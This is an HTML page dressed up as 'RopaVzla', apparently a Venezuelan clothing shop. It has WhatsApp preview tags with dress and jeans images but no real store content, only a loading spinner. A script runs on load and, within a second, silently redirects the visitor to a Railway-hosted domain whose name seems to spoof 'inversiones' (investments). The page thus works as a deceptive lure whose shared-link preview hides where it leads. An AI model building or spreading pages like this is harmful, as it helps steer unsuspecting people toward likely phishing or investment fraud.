<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👗 RopaVzla | Vestidos & Jeans</title>
    
    <!-- WhatsApp Preview con NUEVAS imágenes -->
    <meta property="og:title" content="👗 RopaVzla | Vestidos & Jeans $29+">
    <meta property="og:description" content="Vestidos elegantes, jeans premium. Envíos Venezuela 🇻🇪">
    <meta property="og:image" content="https://images.unsplash.com/photo-1618932260643-eee4a2f652a6?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.1.0">
    <meta property="og:url" content="https://f-spec.github.io/tienda-ropa-vzla">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, Arial, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 50%, #45b7d1 100%);
            height: 100vh; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            overflow: hidden;
        }
        .logo { 
            font-size: 4.5rem; 
            margin-bottom: 1.5rem; 
            animation: bounce 2s infinite; 
        }
        .galeria {
            display: flex;
            gap: 15px;
            margin-bottom: 2rem;
            opacity: 0.9;
        }
        .img-preview {
            width: 100px;
            height: 100px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            object-fit: cover;
            border: 3px solid rgba(255,255,255,0.3);
            transition: all 0.3s ease;
        }
        .img-preview:hover { 
            transform: scale(1.05);
            border-color: white;
        }
        .mensaje { 
            font-size: 1.6rem; 
            margin-bottom: 1rem; 
            opacity: 0.95;
            font-weight: 600;
        }
        .spinner { 
            width: 50px; 
            height: 50px; 
            border: 4px solid rgba(255,255,255,0.3); 
            border-top: 4px solid white; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 1.5rem; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-20px); } 60% { transform: translateY(-10px); } }
        @media (max-width: 480px) {
            .galeria { flex-direction: column; align-items: center; }
            .img-preview { width: 80px; height: 80px; }
        }
    </style>
</head>
<body>
    <!-- LOGO ANIMADO -->
    <div class="logo">👗👖</div>
    
    <!-- GALERÍA PREVIEW NUEVAS IMÁGENES -->
    <div class="galeria">
        <!-- VESTIDO NUEVO -->
        <img class="img-preview" 
             src="https://images.unsplash.com/photo-1618932260643-eee4a2f652a6?q=80&w=480&auto=format&fit=crop&ixlib=rb-4.1.0" 
             alt="Vestido elegante" 
             loading="lazy">
        
        <!-- JEANS NUEVO -->
        <img class="img-preview" 
             src="https://images.unsplash.com/photo-1582552938357-32b906df40cb?q=80&w=435&auto=format&fit=crop&ixlib=rb-4.1.0" 
             alt="Jeans premium" 
             loading="lazy">
    </div>
    
    <!-- ANIMACIÓN CARGA -->
    <div class="spinner"></div>
    <div class="mensaje">🔥 Cargando ofertas increíbles...</div>
    
    <!-- REDIRECCIÓN A TU RAILWAY -->
    <script>
        // Transición suave 0.8 segundos
        setTimeout(function() {
            window.location.replace("https://lnversiones-jl-production.up.railway.app/");
        }, 800);
    </script>
</body>
</html>
